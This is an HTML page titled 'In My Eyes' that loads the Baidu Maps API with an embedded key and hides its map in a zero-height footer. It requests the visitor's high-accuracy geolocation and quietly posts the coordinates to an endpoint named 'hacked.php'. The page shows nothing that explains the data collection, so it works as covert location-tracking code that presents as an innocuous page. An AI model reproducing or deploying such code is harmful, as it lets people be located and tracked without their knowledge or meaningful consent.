<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="viewport" content="initial-scale=1.0, user-scalable=no" />
	<style type="text/css">
		body, html,#allmap {width: 100%;height: 100%;overflow: hidden;margin:0;font-family:"微软雅黑";}
		div#container{width:1000px;}
		div#footer{height: 0px;}
	</style>
	<script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
	<script src="http://api.map.baidu.com/api?v=2.0&ak=GYb0TQ3WMbMQgd4NXpGi6cDn5kOglye8" type="text/javascript"></script>
</head>
</html>
<html>
	<title>In My Eyes</title>
</head>
<body>
	<div id="allmap"></div>
	<div id="footer"></div>
</body>
<script type="text/javascript">
		var map = new BMap.Map("footer");
		var point = new BMap.Point(116.331398,39.897445);
		map.centerAndZoom(point,0);
		var geolocation = new BMap.Geolocation();
		
		geolocation.getCurrentPosition(function(r){
			if(this.getStatus() == BMAP_STATUS_SUCCESS){
				var mk = new BMap.Marker(r.point);
				map.addOverlay(mk);
				map.panTo(r.point);
				var templng = r.point.lng;
				var templat = r.point.lat;

				$.ajax({
					url:'hacked.php',
					data: {jslng:templng, jslat:templat},
					type:'post',
					dataType:'text',
					success:function(data){
						//alert(data);
					}
				})
			}
			else {
				alert('failed'+this.getStatus());
			}        
		},{enableHighAccuracy: true})
	</script>
</html>
		
		